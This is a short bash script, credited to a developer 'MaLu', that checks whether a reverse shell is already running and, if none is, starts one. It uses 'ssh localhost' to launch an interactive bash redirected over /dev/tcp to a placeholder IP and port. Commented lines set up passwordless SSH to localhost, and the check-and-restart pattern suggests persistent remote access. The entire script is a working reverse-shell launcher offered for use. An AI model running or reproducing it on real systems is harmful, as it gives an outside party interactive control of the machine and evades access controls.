#!/bin/bash
# Developer: MaLu
# http://malu.me
ps -ef|grep -e 'bash -i &>/dev/tcp'|grep -v grep
if [ $? -ne 0 ]; then
    echo "start process....."
else
    echo "runing....."
    exit
fi
#ssh-keygen
#cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys
ssh localhost bash -c 'true; bash -i &>/dev/tcp/<IP>/<Port> 0>&1'
